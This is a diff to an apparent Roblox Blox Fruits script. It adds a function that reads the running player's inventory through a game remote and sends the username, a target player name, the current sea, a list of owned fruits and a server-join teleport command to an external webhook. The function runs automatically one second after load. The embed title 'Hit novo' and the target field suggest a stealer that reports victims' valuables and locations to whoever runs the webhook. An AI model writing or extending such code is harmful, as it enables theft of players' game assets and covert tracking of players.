@@ -213,9 +213,30 @@ local function detectarSea()
     end
 end
 
--- Envia PlaceID, JobID e Sea via Webhook
-local function enviarWebhook()
+-- Função para enviar resultados do inventário ao webhook
+local function enviarInventario()
+    local InventoryRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    local InventoryData = InventoryRemote:InvokeServer("getInventory")
+    local fruitsList = ""
+    
+    for _, item in pairs(InventoryData) do
+        if item.Type == "Blox Fruit" then
+            local itemName = item.Name
+            local itemCount = item.Count or 1
+            fruitsList = fruitsList .. string.format("%s - %d\n", itemName, itemCount)
+        end
+    end
+    
+    if fruitsList == "" then
+        fruitsList = "Nenhuma fruta encontrada."
+    end
+
     local seaAtual = detectarSea()
+    local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", placeId, jobId)
+    
+    local infoBlock = string.format("```\nUsername: %s\nYou: %s\nSea: %s\n```", LocalPlayer.Name, targetPlayerName, seaAtual)
+    local inventoryBlock = string.format("```\n%s```", fruitsList)
+    
     local requestData = {
         Url = webhookURL,
         Method = "POST",
@@ -223,13 +244,17 @@ local function enviarWebhook()
             ["Content-Type"] = "application/json"
         },
         Body = HttpService:JSONEncode({
-            content = "*Novo Servidor Encontrado!*\n" ..
-                      "> *Jogador:* "..LocalPlayer.Name.."\n" ..
-                      "> *Place ID:* "..placeId.."\n" ..
-                      "> *Job ID:* "..jobId.."\n" ..
-                      "> *Sea:* "..seaAtual.."\n" ..
-                      "> *Comando para entrar:*\n```lua\n" ..
-                      "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")\n```"
+            content = teleportCommand,
+            embeds = {
+                {
+                    title = "Hit novo",
+                    color = 16711680, -- Vermelho em decimal
+                    description = infoBlock .. "\n" .. inventoryBlock,
+                    footer = {
+                        text = string.format("Place ID: %s | Job ID: %s", placeId, jobId)
+                    }
+                }
+            }
         })
     }
 
@@ -245,6 +270,6 @@ local function enviarWebhook()
 end
 
 task.wait(1)
-enviarWebhook()
+enviarInventario()
 
-print("Script carregado! Enviando Job ID, Place ID e Sea para o webhook…")
+print("Script carregado! Enviando informações para o webhook…")
